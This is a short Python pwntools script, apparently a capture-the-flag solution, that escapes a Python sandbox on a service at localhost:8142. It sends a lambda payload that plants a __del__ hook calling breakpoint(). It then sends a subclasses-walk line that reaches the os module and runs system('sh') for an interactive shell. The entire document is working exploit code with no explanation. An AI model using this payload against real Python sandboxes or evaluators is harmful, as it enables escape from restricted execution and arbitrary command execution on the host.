from pwn import *

payload = '(a:=(lambda**a:a)(__del__=lambda*a:breakpoint()),type(*a,(),a)())'

p = remote('localhost', 8142)
p.sendline(payload)
p.sendline(b'().__class__.__base__.__subclasses__()[119].append.__globals__["_os"].system("sh")')
p.interactive()
